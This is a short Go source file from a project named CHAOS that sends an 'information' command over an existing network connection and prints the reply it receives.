package information

import (
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/internal/models"
	"github.com/tiagorlampert/CHAOS/internal/usecase"
	"github.com/tiagorlampert/CHAOS/internal/util/network"
	"net"
)

type InformationUseCase struct {
	Connection net.Conn
}

func NewInformationUseCase(conn net.Conn) usecase.Information {
	return &InformationUseCase{
		Connection: conn,
	}
}

func (i InformationUseCase) Collect() {
	err := network.Send(i.Connection, models.Message{
		Command: "information",
	})
	if err != nil {
		log.WithField("cause", err.Error()).Error("error sending request")
		return
	}

	response, err := network.Read(i.Connection)
	if err != nil {
		log.WithField("cause", err.Error()).Error("error reading response")
	}

	fmt.Println(string(response.Data))
}
